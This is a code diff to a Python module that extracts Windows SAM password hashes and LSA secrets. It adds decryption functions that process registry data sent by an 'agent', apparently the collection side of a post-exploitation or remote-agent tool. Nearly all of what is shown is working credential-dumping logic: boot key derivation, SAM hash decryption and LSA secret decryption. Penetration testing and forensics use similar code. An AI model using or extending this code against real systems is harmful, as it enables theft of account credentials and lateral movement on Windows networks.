@@ -1,7 +1,8 @@
-"""Offline registry hive parsing — SAM hashes and LSA secrets.
+"""Registry secret extraction — SAM hashes and LSA secrets.
 
-Parses raw REGF hive bytes (received from agent or loaded from disk).
-No network, no RPC — pure offline decryption.
+Supports two modes:
+- Structured data from agent protocol v2 (direct registry reads)
+- Raw REGF hive bytes (offline / legacy)
 """
 
 import struct
@@ -32,6 +33,64 @@ class LsaSecret:
     value: bytes
     decoded: str = ""
 
+
+# ── Structured data (protocol v2) ─────────────────────────────
+
+def extract_boot_key_from_classes(boot_key_classes: list[bytes]) -> bytes:
+    """Extract boot key from raw class name bytes (UTF-16LE)."""
+    parts = []
+    for cls in boot_key_classes:
+        text = cls.decode("utf-16-le").rstrip("\x00")
+        parts.append(text.encode("ascii"))
+    return extract_boot_key(parts[0], parts[1], parts[2], parts[3])
+
+
+def parse_sam_data(f_value: bytes, users: list[tuple[int, bytes]],
+                   boot_key: bytes) -> list[SamHash]:
+    """Parse structured SAM data (F value + user V values)."""
+    hashes = []
+    if len(f_value) < 0x70:
+        return hashes
+
+    hashed_boot_key = compute_hashed_boot_key(boot_key, f_value)
+    sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]
+
+    for rid, v_value in users:
+        if not v_value:
+            continue
+        try:
+            sam_hash = _parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
+            if sam_hash:
+                hashes.append(sam_hash)
+        except (KeyError, RuntimeError):
+            continue
+
+    return hashes
+
+
+def parse_security_data(pol_ek_list: bytes,
+                        secrets_raw: list[tuple[str, bytes]],
+                        boot_key: bytes) -> list[LsaSecret]:
+    """Parse structured SECURITY data (PolEKList + secret CurrVals)."""
+    secrets = []
+    if not pol_ek_list:
+        return secrets
+
+    lsa_key = decrypt_lsa_key(boot_key, pol_ek_list)
+
+    for name, encrypted in secrets_raw:
+        try:
+            decrypted = decrypt_lsa_secret(lsa_key, encrypted)
+            secret = LsaSecret(name=name, value=decrypted)
+            secret.decoded = _decode_secret(name, decrypted)
+            secrets.append(secret)
+        except (KeyError, RuntimeError):
+            continue
+
+    return secrets
+
+
+# ── Raw hive bytes (offline / legacy) ──────────────────────────
 
 def extract_boot_key_from_hive(system_data: bytes) -> bytes:
     """Extract boot key from raw SYSTEM hive bytes."""
@@ -122,6 +181,8 @@ def parse_security_hive(sec_data: bytes, boot_key: bytes) -> list[LsaSecret]:
 
     return secrets
 
+
+# ── Shared helpers ─────────────────────────────────────────────
 
 def _parse_sam_v(v_value: bytes, rid: int, hashed_boot_key: bytes, revision: int) -> SamHash | None:
     """Parse SAM V value to extract username and encrypted hash."""
